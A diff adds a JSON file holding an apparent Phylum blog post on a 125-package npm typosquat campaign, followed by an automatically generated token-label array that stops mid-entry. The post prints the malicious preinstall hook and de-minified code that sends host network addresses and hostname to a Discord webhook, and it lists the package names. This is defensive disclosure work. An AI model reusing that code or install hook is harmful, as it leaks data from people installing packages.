@@ -1,0 +1,1678 @@
+{
+  "text": "\nPhylum is tracking a large typosquat campaign targeting the npm ecosystem. A user is currently publishing many typosquat packages masquerading as react and angular. As of this writing, 125 packages have been released in what appears to be an ongoing campaign. We are reporting these packages as we encounter them and have reported the Discord webhook for removal.\n\nTechnical Details\nInspecting the package.json we find a preinstall hook that initiates execution:\n{\n  \"name\": \"zngularjs\",\n  \"version\": \"1.1.2\",\n  \"description\": \"Research project\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\\\"Error: no test specified\\\\\" && exit 1\",\n    \"preinstall\": \"node new.js\"\n  },\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\": \"git+https://github.com/serialfuzzer/AngulerJS.git\"\n  },\n  \"keywords\": [\n    \"dependency_confusion\"\n  ],\n  \"author\": \"serialfuzzer\",\n  \"license\": \"ISC\",\n  \"bugs\": {\n    \"url\": \"https://github.com/serialfuzzer/AngulerJS/issues\"\n  },\n  \"homepage\": \"https://github.com/serialfuzzer/AngulerJS#readme\"\n}\nInside the new.js we find the following (formatted for readability):\nfunction sendToDiscord(e, t) {\n    const o = new URL(e),\n        n = JSON.stringify({\n            content: t\n        }),\n        s = {\n            hostname: o.hostname,\n            port: 443,\n            path: o.pathname + o.search,\n            method: \"POST\",\n            headers: {\n                \"Content-Type\": \"application/json\",\n                \"Content-Length\": n.length\n            }\n        },\n        r = https.request(s, e => {});\n    r.on(\"error\", e => {\n        console.error(e)\n    }), r.write(n), r.end()\n}\nconst https = require(\"https\"),\n    os = require(\"os\"),\n    main = ! function() {\n        var e = \"https://discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr\";\n        const t = Object.keys(os.networkInterfaces()).map(e => os.networkInterfaces()[e][0].address).join(\",\").concat(\", \" + os.hostname());\n        return sendToDiscord(e, t), {}\n    }();\nmodule.exports = main;\nThis is a fairly rudimentary attempt at data exfiltration that sends information about network interfaces to a remote Discord channel. We’ve reported the Discord webhook and have ensured that it has been disabled. Any existing packages will now be unable to communicate with the package author.\nA Research Project?\nAs with most of these campaigns, it’s difficult to determine intent. Is this part of a misguided research project? A malicious campaign masquerading as a bug bounty attempt? It’s hard to say. Even in cases where we'd be inclined to give the author the benefit of the doubt, we've seen subsequent packages become clearly malicious before.\nIn this case, the package.json makes a reference to a GitHub repository. Since this field is entirely user-provided, we've reached out to the GitHub user to determine whether they are affiliated with this campaign and to hopefully determine intent.\npackage.json\nTowards More Secure npm Development\nOne of the more disconcerting facts about modern software development is the fact that so much of it involves relying on and executing code written by unknown users from the internet. To address this, Phylum has open-sourced its sandbox  that locks down network, disk and environment resources. This sandbox is built into our (also open sourced) CLI  so that users can run things like:\nphylum npm install <pkgName>\nBelow is the actual behavior of the sandbox on one of the packages from the above campaign. When the package attempts to reach out to the Discord webhook, the installation process is aborted. Please note that we had to pull the tar.gz from our file storage, as the package in question had already been removed by npm. In a real scenario, this package would've been blocked by the Phylum package pre-check before it even had a chance to run in the sandbox!\nTyposquats remain a popular distribution technique for malware. This is one of the larger typosquat activities we've seen this year and should serve as a constant reminder that actors continue to publish malicious packages into our open-source package repositories.\nThe Packages\nGiven the speed that these packages were published, it seems likely that publications are automated. It is not entirely clear how some of these packages names were generated, as many have edit distances far away from the actual angular and react package names. It seems reasonable the edits are also automated, resulting in some non-human like \"typos\".\n\nName\tVersion\tCreated\nanoularjs\t1.1.2\tTue, 26 Sep 2023 03:04:26 GMT\nangslarjs\t1.1.2\tTue, 26 Sep 2023 03:04:25 GMT\nankularjs\t1.1.2\tTue, 26 Sep 2023 03:04:24 GMT\nanxularjs\t1.1.2\tTue, 26 Sep 2023 03:04:22 GMT\nangnlarjs\t1.1.2\tTue, 26 Sep 2023 03:04:22 GMT\nangglarjs\t1.1.2\tTue, 26 Sep 2023 03:04:19 GMT\nanzularjs\t1.1.2\tTue, 26 Sep 2023 03:04:17 GMT\nangtlarjs\t1.1.2\tTue, 26 Sep 2023 03:04:17 GMT\naniularjs\t1.1.2\tTue, 26 Sep 2023 03:04:16 GMT\nanbularjs\t1.1.2\tTue, 26 Sep 2023 03:04:15 GMT\nanyularjs\t1.1.2\tTue, 26 Sep 2023 03:04:14 GMT\nangblarjs\t1.1.2\tTue, 26 Sep 2023 03:04:13 GMT\nannularjs\t1.1.2\tTue, 26 Sep 2023 03:04:12 GMT\nangmlarjs\t1.1.2\tTue, 26 Sep 2023 03:04:09 GMT\nangelarjs\t1.1.2\tTue, 26 Sep 2023 03:04:08 GMT\nanmularjs\t1.1.2\tTue, 26 Sep 2023 03:04:07 GMT\nangalarjs\t1.1.2\tTue, 26 Sep 2023 03:04:07 GMT\nanwularjs\t1.1.2\tTue, 26 Sep 2023 03:04:05 GMT\nanghlarjs\t1.1.2\tTue, 26 Sep 2023 03:04:04 GMT\nanlularjs\t1.1.2\tTue, 26 Sep 2023 03:04:03 GMT\nanrularjs\t1.1.2\tTue, 26 Sep 2023 03:04:01 GMT\nangrlarjs\t1.1.2\tTue, 26 Sep 2023 03:03:56 GMT\nangilarjs\t1.1.2\tTue, 26 Sep 2023 03:03:56 GMT\nandularjs\t1.1.2\tTue, 26 Sep 2023 03:03:54 GMT\nangflarjs\t1.1.2\tTue, 26 Sep 2023 03:03:53 GMT\nangclarjs\t1.1.2\tTue, 26 Sep 2023 03:03:52 GMT\nangjlarjs\t1.1.2\tTue, 26 Sep 2023 03:03:51 GMT\nanuularjs\t1.1.2\tTue, 26 Sep 2023 03:03:49 GMT\nangdlarjs\t1.1.2\tTue, 26 Sep 2023 03:03:48 GMT\nangolarjs\t1.1.2\tTue, 26 Sep 2023 03:03:46 GMT\nangllarjs\t1.1.2\tTue, 26 Sep 2023 03:03:46 GMT\nanpularjs\t1.1.2\tTue, 26 Sep 2023 03:03:45 GMT\nansularjs\t1.1.2\tTue, 26 Sep 2023 03:03:44 GMT\nangplarjs\t1.1.2\tTue, 26 Sep 2023 03:03:43 GMT\nangklarjs\t1.1.2\tTue, 26 Sep 2023 03:03:42 GMT\nanvularjs\t1.1.2\tTue, 26 Sep 2023 03:03:40 GMT\nantularjs\t1.1.2\tTue, 26 Sep 2023 03:03:39 GMT\nbngularjs\t1.1.2\tTue, 26 Sep 2023 02:36:23 GMT\naggularjs\t1.1.2\tTue, 26 Sep 2023 02:36:21 GMT\nreacltjs\t1.1.2\tTue, 26 Sep 2023 02:36:20 GMT\nacgularjs\t1.1.2\tTue, 26 Sep 2023 02:36:18 GMT\nreacbtjs\t1.1.2\tTue, 26 Sep 2023 02:36:15 GMT\nrejactjs\t1.1.2\tTue, 26 Sep 2023 02:36:13 GMT\nakgularjs\t1.1.2\tTue, 26 Sep 2023 02:36:11 GMT\nahgularjs\t1.1.2\tTue, 26 Sep 2023 02:36:09 GMT\nreanctjs\t1.1.2\tTue, 26 Sep 2023 02:36:08 GMT\nbangularjs\t1.1.2\tTue, 26 Sep 2023 02:36:06 GMT\nreacttjs\t1.1.2\tTue, 26 Sep 2023 02:36:04 GMT\nreoactjs\t1.1.2\tTue, 26 Sep 2023 02:36:02 GMT\nreawctjs\t1.1.2\tTue, 26 Sep 2023 02:36:00 GMT\ndoemailer\t1.1.2\tTue, 26 Sep 2023 02:35:59 GMT\nreacutjs\t1.1.2\tTue, 26 Sep 2023 02:35:57 GMT\nreacmtjs\t1.1.2\tTue, 26 Sep 2023 02:35:55 GMT\nalgularjs\t1.1.2\tTue, 26 Sep 2023 02:35:53 GMT\ndangularjs\t1.1.2\tTue, 26 Sep 2023 02:35:51 GMT\ndngularjs\t1.1.2\tTue, 26 Sep 2023 02:35:49 GMT\nhngularjs\t1.1.2\tTue, 26 Sep 2023 02:35:46 GMT\nreacitjs\t1.1.2\tTue, 26 Sep 2023 02:35:44 GMT\nzhunkr\t1.1.2\tTue, 26 Sep 2023 02:35:43 GMT\naugularjs\t1.1.2\tTue, 26 Sep 2023 02:35:41 GMT\nreazctjs\t1.1.2\tTue, 26 Sep 2023 02:35:39 GMT\nreacatjs\t1.1.2\tTue, 26 Sep 2023 02:35:37 GMT\nazgularjs\t1.1.2\tTue, 26 Sep 2023 02:35:36 GMT\nreapctjs\t1.1.2\tTue, 26 Sep 2023 02:35:34 GMT\nrekactjs\t1.1.2\tTue, 26 Sep 2023 02:35:32 GMT\navgularjs\t1.1.2\tTue, 26 Sep 2023 02:35:31 GMT\ncangularjs\t1.1.2\tTue, 26 Sep 2023 02:35:29 GMT\njngularjs\t1.1.2\tTue, 26 Sep 2023 02:35:28 GMT\nreacctjs\t1.1.2\tTue, 26 Sep 2023 02:35:25 GMT\nvngularjs\t1.1.2\tTue, 26 Sep 2023 02:35:24 GMT\nrenactjs\t1.1.2\tTue, 26 Sep 2023 02:35:22 GMT\nreqactjs\t1.1.2\tTue, 26 Sep 2023 02:35:20 GMT\nreacntjs\t1.1.2\tTue, 26 Sep 2023 02:35:17 GMT\nungularjs\t1.1.2\tTue, 26 Sep 2023 02:35:15 GMT\nautoprifixir\t1.1.2\tTue, 26 Sep 2023 02:35:13 GMT\naygularjs\t1.1.2\tTue, 26 Sep 2023 02:35:11 GMT\nsngularjs\t1.1.2\tTue, 26 Sep 2023 02:35:09 GMT\nreacdtjs\t1.1.2\tTue, 26 Sep 2023 02:35:08 GMT\npngularjs\t1.1.2\tTue, 26 Sep 2023 02:35:06 GMT\nreacftjs\t1.1.2\tTue, 26 Sep 2023 02:35:04 GMT\nanaularjs\t1.1.2\tTue, 26 Sep 2023 02:35:02 GMT\nadgularjs\t1.1.2\tTue, 26 Sep 2023 02:35:00 GMT\ngngularjs\t1.1.2\tTue, 26 Sep 2023 02:34:58 GMT\naagularjs\t1.1.2\tTue, 26 Sep 2023 02:34:55 GMT\nrefactjs\t1.1.2\tTue, 26 Sep 2023 02:34:54 GMT\nredactjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreacgtjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nasgularjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nrealctjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nnngularjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nrecactjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nrelactjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\ndodemailar\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreractjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreacqtjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreacstjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreaectjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreacotjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreacwtjs\t1.1.2\tTue, 26 Sep 2023 02:34:53 GMT\nreyactjs\t1.1.2\tTue, 26 Sep 2023 02:34:52 GMT\nrexactjs\t1.1.2\tTue, 26 Sep 2023 02:34:52 GMT\nanfularjs\t1.1.2\tTue, 26 Sep 2023 02:34:52 GMT\nawgularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nreaoctjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nrepactjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nreadctjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\naegularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nancularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nreajctjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nreahctjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nafgularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nanhularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nreaqctjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\napgularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\ncngularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nlngularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nkngularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nargularjs\t1.1.2\tTue, 26 Sep 2023 02:34:51 GMT\nreakctjs\t1.1.2\tTue, 26 Sep 2023 02:34:50 GMT\ntngularjs\t1.1.2\tTue, 26 Sep 2023 02:34:50 GMT\nreagctjs\t1.1.2\tTue, 26 Sep 2023 02:34:50 GMT\nreacztjs\t1.1.2\tTue, 26 Sep 2023 02:34:50 GMT\nreasctjs\t1.1.2\tTue, 26 Sep 2023 02:34:50 GMT\nreacjtjs\t1.1.2\tTue, 26 Sep 2023 02:34:50 GMT\nreaxctjs\t1.1.2\tTue, 26 Sep 2023 02:34:50 GMT\n",
+  "entities": [
+    {
+      "entity": "phylum",
+      "type": "LABEL_1",
+      "score": 0.6218571066856384,
+      "start": 1,
+      "end": 7
+    },
+    {
+      "entity": "is",
+      "type": "LABEL_0",
+      "score": 0.5091333985328674,
+      "start": 8,
+      "end": 10
+    },
+    {
+      "entity": "tracking a large typosquat campaign",
+      "type": "LABEL_1",
+      "score": 0.6438285112380981,
+      "start": 11,
+      "end": 46
+    },
+    {
+      "entity": "targeting",
+      "type": "LABEL_0",
+      "score": 0.6444569826126099,
+      "start": 47,
+      "end": 56
+    },
+    {
+      "entity": "the npm",
+      "type": "LABEL_1",
+      "score": 0.6394729614257812,
+      "start": 57,
+      "end": 64
+    },
+    {
+      "entity": "ecosystem",
+      "type": "LABEL_0",
+      "score": 0.5327181816101074,
+      "start": 65,
+      "end": 74
+    },
+    {
+      "entity": ". a user is",
+      "type": "LABEL_1",
+      "score": 0.7875391244888306,
+      "start": 74,
+      "end": 85
+    },
+    {
+      "entity": "currently",
+      "type": "LABEL_0",
+      "score": 0.5789446234703064,
+      "start": 86,
+      "end": 95
+    },
+    {
+      "entity": "publishing many typosquat",
+      "type": "LABEL_1",
+      "score": 0.6241916418075562,
+      "start": 96,
+      "end": 121
+    },
+    {
+      "entity": "packages",
+      "type": "LABEL_0",
+      "score": 0.5437731146812439,
+      "start": 122,
+      "end": 130
+    },
+    {
+      "entity": "masquerading",
+      "type": "LABEL_1",
+      "score": 0.5828147530555725,
+      "start": 131,
+      "end": 143
+    },
+    {
+      "entity": "as react and angula",
+      "type": "LABEL_0",
+      "score": 0.5270577669143677,
+      "start": 144,
+      "end": 163
+    },
+    {
+      "entity": "##r. as of this writing,",
+      "type": "LABEL_1",
+      "score": 0.730931282043457,
+      "start": 163,
+      "end": 185
+    },
+    {
+      "entity": "125",
+      "type": "LABEL_0",
+      "score": 0.5798571109771729,
+      "start": 186,
+      "end": 189
+    },
+    {
+      "entity": "packages",
+      "type": "LABEL_1",
+      "score": 0.5373674631118774,
+      "start": 190,
+      "end": 198
+    },
+    {
+      "entity": "have been",
+      "type": "LABEL_0",
+      "score": 0.576392412185669,
+      "start": 199,
+      "end": 208
+    },
+    {
+      "entity": "released in what appears to be",
+      "type": "LABEL_1",
+      "score": 0.6395596861839294,
+      "start": 209,
+      "end": 239
+    },
+    {
+      "entity": "an ongoing campaign",
+      "type": "LABEL_0",
+      "score": 0.7015736699104309,
+      "start": 240,
+      "end": 259
+    },
+    {
+      "entity": ". we are reporting these packages as we encounter them and",
+      "type": "LABEL_1",
+      "score": 0.6406295299530029,
+      "start": 259,
+      "end": 317
+    },
+    {
+      "entity": "have reported the discord",
+      "type": "LABEL_0",
+      "score": 0.6052228212356567,
+      "start": 318,
+      "end": 343
+    },
+    {
+      "entity": "webhook",
+      "type": "LABEL_1",
+      "score": 0.5229671001434326,
+      "start": 344,
+      "end": 351
+    },
+    {
+      "entity": "for removal",
+      "type": "LABEL_0",
+      "score": 0.704371452331543,
+      "start": 352,
+      "end": 363
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.6545365452766418,
+      "start": 363,
+      "end": 364
+    },
+    {
+      "entity": "we ’",
+      "type": "LABEL_1",
+      "score": 0.6657509803771973,
+      "start": 2192,
+      "end": 2195
+    },
+    {
+      "entity": "ve reported",
+      "type": "LABEL_0",
+      "score": 0.6491777896881104,
+      "start": 2195,
+      "end": 2206
+    },
+    {
+      "entity": "the disco",
+      "type": "LABEL_1",
+      "score": 0.5820093154907227,
+      "start": 2207,
+      "end": 2216
+    },
+    {
+      "entity": "##rd webhook",
+      "type": "LABEL_0",
+      "score": 0.5537399053573608,
+      "start": 2216,
+      "end": 2226
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.64557284116745,
+      "start": 2227,
+      "end": 2230
+    },
+    {
+      "entity": "have ensured",
+      "type": "LABEL_0",
+      "score": 0.626533031463623,
+      "start": 2231,
+      "end": 2243
+    },
+    {
+      "entity": "that it",
+      "type": "LABEL_1",
+      "score": 0.71712327003479,
+      "start": 2244,
+      "end": 2251
+    },
+    {
+      "entity": "has been disabled",
+      "type": "LABEL_0",
+      "score": 0.536325216293335,
+      "start": 2252,
+      "end": 2269
+    },
+    {
+      "entity": ". any",
+      "type": "LABEL_1",
+      "score": 0.7471157908439636,
+      "start": 2269,
+      "end": 2274
+    },
+    {
+      "entity": "existing",
+      "type": "LABEL_0",
+      "score": 0.647723376750946,
+      "start": 2275,
+      "end": 2283
+    },
+    {
+      "entity": "packages will",
+      "type": "LABEL_1",
+      "score": 0.5766322612762451,
+      "start": 2284,
+      "end": 2297
+    },
+    {
+      "entity": "now",
+      "type": "LABEL_0",
+      "score": 0.5641257166862488,
+      "start": 2298,
+      "end": 2301
+    },
+    {
+      "entity": "be unable to",
+      "type": "LABEL_1",
+      "score": 0.5892152190208435,
+      "start": 2302,
+      "end": 2314
+    },
+    {
+      "entity": "communicate with",
+      "type": "LABEL_0",
+      "score": 0.6127804517745972,
+      "start": 2315,
+      "end": 2331
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_1",
+      "score": 0.5684946179389954,
+      "start": 2332,
+      "end": 2335
+    },
+    {
+      "entity": "package author",
+      "type": "LABEL_0",
+      "score": 0.6061890125274658,
+      "start": 2336,
+      "end": 2350
+    },
+    {
+      "entity": ". a research",
+      "type": "LABEL_1",
+      "score": 0.5808928608894348,
+      "start": 2350,
+      "end": 2362
+    },
+    {
+      "entity": "project? as with most of these campaigns",
+      "type": "LABEL_0",
+      "score": 0.6204138398170471,
+      "start": 2363,
+      "end": 2403
+    },
+    {
+      "entity": ", it ’",
+      "type": "LABEL_1",
+      "score": 0.6446967720985413,
+      "start": 2403,
+      "end": 2408
+    },
+    {
+      "entity": "s difficult",
+      "type": "LABEL_0",
+      "score": 0.7507110834121704,
+      "start": 2408,
+      "end": 2419
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.6427502036094666,
+      "start": 2420,
+      "end": 2422
+    },
+    {
+      "entity": "determine intent",
+      "type": "LABEL_0",
+      "score": 0.6112890839576721,
+      "start": 2423,
+      "end": 2439
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7958647608757019,
+      "start": 2439,
+      "end": 2440
+    },
+    {
+      "entity": "is",
+      "type": "LABEL_0",
+      "score": 0.5098258256912231,
+      "start": 2441,
+      "end": 2443
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.5686262845993042,
+      "start": 2444,
+      "end": 2448
+    },
+    {
+      "entity": "part",
+      "type": "LABEL_0",
+      "score": 0.7563877701759338,
+      "start": 2449,
+      "end": 2453
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.5542431473731995,
+      "start": 2454,
+      "end": 2456
+    },
+    {
+      "entity": "a misguide",
+      "type": "LABEL_0",
+      "score": 0.6311696171760559,
+      "start": 2457,
+      "end": 2467
+    },
+    {
+      "entity": "##d research",
+      "type": "LABEL_1",
+      "score": 0.6499100923538208,
+      "start": 2467,
+      "end": 2477
+    },
+    {
+      "entity": "project?",
+      "type": "LABEL_0",
+      "score": 0.5409970283508301,
+      "start": 2478,
+      "end": 2486
+    },
+    {
+      "entity": "a malicious",
+      "type": "LABEL_1",
+      "score": 0.5562278032302856,
+      "start": 2487,
+      "end": 2498
+    },
+    {
+      "entity": "campaign masquerading",
+      "type": "LABEL_0",
+      "score": 0.534860372543335,
+      "start": 2499,
+      "end": 2520
+    },
+    {
+      "entity": "as",
+      "type": "LABEL_1",
+      "score": 0.5072834491729736,
+      "start": 2521,
+      "end": 2523
+    },
+    {
+      "entity": "a bug bounty",
+      "type": "LABEL_0",
+      "score": 0.5940526127815247,
+      "start": 2524,
+      "end": 2536
+    },
+    {
+      "entity": "attempt? it ’",
+      "type": "LABEL_1",
+      "score": 0.5944740176200867,
+      "start": 2537,
+      "end": 2549
+    },
+    {
+      "entity": "s",
+      "type": "LABEL_0",
+      "score": 0.6958733201026917,
+      "start": 2549,
+      "end": 2550
+    },
+    {
+      "entity": "hard to say. even",
+      "type": "LABEL_1",
+      "score": 0.6723063588142395,
+      "start": 2551,
+      "end": 2568
+    },
+    {
+      "entity": "in cases where",
+      "type": "LABEL_0",
+      "score": 0.6473566889762878,
+      "start": 2569,
+      "end": 2583
+    },
+    {
+      "entity": "we '",
+      "type": "LABEL_1",
+      "score": 0.6348236799240112,
+      "start": 2584,
+      "end": 2587
+    },
+    {
+      "entity": "d",
+      "type": "LABEL_0",
+      "score": 0.6510658264160156,
+      "start": 2587,
+      "end": 2588
+    },
+    {
+      "entity": "be",
+      "type": "LABEL_1",
+      "score": 0.6302803158760071,
+      "start": 2589,
+      "end": 2591
+    },
+    {
+      "entity": "inclined",
+      "type": "LABEL_0",
+      "score": 0.5284496545791626,
+      "start": 2592,
+      "end": 2600
+    },
+    {
+      "entity": "to give the author",
+      "type": "LABEL_1",
+      "score": 0.6424571871757507,
+      "start": 2601,
+      "end": 2619
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.5495708584785461,
+      "start": 2620,
+      "end": 2623
+    },
+    {
+      "entity": "benefit of the",
+      "type": "LABEL_1",
+      "score": 0.6253225207328796,
+      "start": 2624,
+      "end": 2638
+    },
+    {
+      "entity": "doubt",
+      "type": "LABEL_0",
+      "score": 0.5216274261474609,
+      "start": 2639,
+      "end": 2644
+    },
+    {
+      "entity": ", we '",
+      "type": "LABEL_1",
+      "score": 0.604576587677002,
+      "start": 2644,
+      "end": 2649
+    },
+    {
+      "entity": "ve",
+      "type": "LABEL_0",
+      "score": 0.678656280040741,
+      "start": 2649,
+      "end": 2651
+    },
+    {
+      "entity": "seen subsequent packages",
+      "type": "LABEL_1",
+      "score": 0.5518049597740173,
+      "start": 2652,
+      "end": 2676
+    },
+    {
+      "entity": "become clearly",
+      "type": "LABEL_0",
+      "score": 0.5516806840896606,
+      "start": 2677,
+      "end": 2691
+    },
+    {
+      "entity": "malicious before. in this case,",
+      "type": "LABEL_1",
+      "score": 0.6752084493637085,
+      "start": 2692,
+      "end": 2723
+    },
+    {
+      "entity": "the package",
+      "type": "LABEL_0",
+      "score": 0.5798687934875488,
+      "start": 2724,
+      "end": 2735
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.5554278492927551,
+      "start": 2735,
+      "end": 2736
+    },
+    {
+      "entity": "json makes a reference",
+      "type": "LABEL_0",
+      "score": 0.6601390838623047,
+      "start": 2736,
+      "end": 2758
+    },
+    {
+      "entity": "to a github",
+      "type": "LABEL_1",
+      "score": 0.5414767861366272,
+      "start": 2759,
+      "end": 2770
+    },
+    {
+      "entity": "repository",
+      "type": "LABEL_0",
+      "score": 0.6268361210823059,
+      "start": 2771,
+      "end": 2781
+    },
+    {
+      "entity": ". since this field",
+      "type": "LABEL_1",
+      "score": 0.6759436130523682,
+      "start": 2781,
+      "end": 2799
+    },
+    {
+      "entity": "is entirely user -",
+      "type": "LABEL_0",
+      "score": 0.678455114364624,
+      "start": 2800,
+      "end": 2817
+    },
+    {
+      "entity": "provided, we '",
+      "type": "LABEL_1",
+      "score": 0.6334632039070129,
+      "start": 2817,
+      "end": 2830
+    },
+    {
+      "entity": "ve reached out",
+      "type": "LABEL_0",
+      "score": 0.5851781964302063,
+      "start": 2830,
+      "end": 2844
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.5972496867179871,
+      "start": 2845,
+      "end": 2847
+    },
+    {
+      "entity": "the github user",
+      "type": "LABEL_0",
+      "score": 0.6824684739112854,
+      "start": 2848,
+      "end": 2863
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.5673421025276184,
+      "start": 2864,
+      "end": 2866
+    },
+    {
+      "entity": "determine whether they are",
+      "type": "LABEL_0",
+      "score": 0.6291914582252502,
+      "start": 2867,
+      "end": 2893
+    },
+    {
+      "entity": "affiliated",
+      "type": "LABEL_1",
+      "score": 0.515521764755249,
+      "start": 2894,
+      "end": 2904
+    },
+    {
+      "entity": "with",
+      "type": "LABEL_0",
+      "score": 0.6240253448486328,
+      "start": 2905,
+      "end": 2909
+    },
+    {
+      "entity": "this",
+      "type": "LABEL_1",
+      "score": 0.7870315313339233,
+      "start": 2910,
+      "end": 2914
+    },
+    {
+      "entity": "campaign",
+      "type": "LABEL_0",
+      "score": 0.8521994948387146,
+      "start": 2915,
+      "end": 2923
+    },
+    {
+      "entity": "and to",
+      "type": "LABEL_1",
+      "score": 0.60996413230896,
+      "start": 2924,
+      "end": 2930
+    },
+    {
+      "entity": "hopefully determine intent",
+      "type": "LABEL_0",
+      "score": 0.6807063221931458,
+      "start": 2931,
+      "end": 2957
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7860040664672852,
+      "start": 2957,
+      "end": 2958
+    },
+    {
+      "entity": "package",
+      "type": "LABEL_0",
+      "score": 0.5133182406425476,
+      "start": 2959,
+      "end": 2966
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8107092976570129,
+      "start": 2966,
+      "end": 2967
+    },
+    {
+      "entity": "json",
+      "type": "LABEL_0",
+      "score": 0.7133201360702515,
+      "start": 2967,
+      "end": 2971
+    },
+    {
+      "entity": "towards",
+      "type": "LABEL_1",
+      "score": 0.6013721823692322,
+      "start": 2972,
+      "end": 2979
+    },
+    {
+      "entity": "more secure npm development one",
+      "type": "LABEL_0",
+      "score": 0.6798960566520691,
+      "start": 2980,
+      "end": 3011
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.538007915019989,
+      "start": 3012,
+      "end": 3014
+    },
+    {
+      "entity": "the more disco",
+      "type": "LABEL_0",
+      "score": 0.6023030877113342,
+      "start": 3015,
+      "end": 3029
+    },
+    {
+      "entity": "##nc",
+      "type": "LABEL_1",
+      "score": 0.6754984259605408,
+      "start": 3029,
+      "end": 3031
+    },
+    {
+      "entity": "##erting facts about modern software development is the fact",
+      "type": "LABEL_0",
+      "score": 0.6522802114486694,
+      "start": 3031,
+      "end": 3089
+    },
+    {
+      "entity": "that so much",
+      "type": "LABEL_1",
+      "score": 0.5715838670730591,
+      "start": 3090,
+      "end": 3102
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_0",
+      "score": 0.5102694034576416,
+      "start": 3103,
+      "end": 3105
+    },
+    {
+      "entity": "it involves relying",
+      "type": "LABEL_1",
+      "score": 0.5457342267036438,
+      "start": 3106,
+      "end": 3125
+    },
+    {
+      "entity": "on",
+      "type": "LABEL_0",
+      "score": 0.758665919303894,
+      "start": 3126,
+      "end": 3128
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.5967448353767395,
+      "start": 3129,
+      "end": 3132
+    },
+    {
+      "entity": "executing code written by",
+      "type": "LABEL_0",
+      "score": 0.5906316041946411,
+      "start": 3133,
+      "end": 3158
+    },
+    {
+      "entity": "unknown",
+      "type": "LABEL_1",
+      "score": 0.6583207845687866,
+      "start": 3159,
+      "end": 3166
+    },
+    {
+      "entity": "users from the internet",
+      "type": "LABEL_0",
+      "score": 0.6394123435020447,
+      "start": 3167,
+      "end": 3190
+    },
+    {
+      "entity": ". to",
+      "type": "LABEL_1",
+      "score": 0.6923257112503052,
+      "start": 3190,
+      "end": 3194
+    },
+    {
+      "entity": "address",
+      "type": "LABEL_0",
+      "score": 0.6670239567756653,
+      "start": 3195,
+      "end": 3202
+    },
+    {
+      "entity": "this, ph",
+      "type": "LABEL_1",
+      "score": 0.675382137298584,
+      "start": 3203,
+      "end": 3211
+    },
+    {
+      "entity": "##ylum has open - sourced its",
+      "type": "LABEL_0",
+      "score": 0.696724534034729,
+      "start": 3211,
+      "end": 3236
+    },
+    {
+      "entity": "sandbox that locks",
+      "type": "LABEL_1",
+      "score": 0.5584707260131836,
+      "start": 3237,
+      "end": 3256
+    },
+    {
+      "entity": "down network",
+      "type": "LABEL_0",
+      "score": 0.7267120480537415,
+      "start": 3257,
+      "end": 3269
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7209594249725342,
+      "start": 3269,
+      "end": 3270
+    },
+    {
+      "entity": "disk",
+      "type": "LABEL_0",
+      "score": 0.6203317046165466,
+      "start": 3271,
+      "end": 3275
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.6354818344116211,
+      "start": 3276,
+      "end": 3279
+    },
+    {
+      "entity": "environment resources",
+      "type": "LABEL_0",
+      "score": 0.7636959552764893,
+      "start": 3280,
+      "end": 3301
+    },
+    {
+      "entity": ". this sandbox",
+      "type": "LABEL_1",
+      "score": 0.7174914479255676,
+      "start": 3301,
+      "end": 3315
+    },
+    {
+      "entity": "is built into",
+      "type": "LABEL_0",
+      "score": 0.6551523804664612,
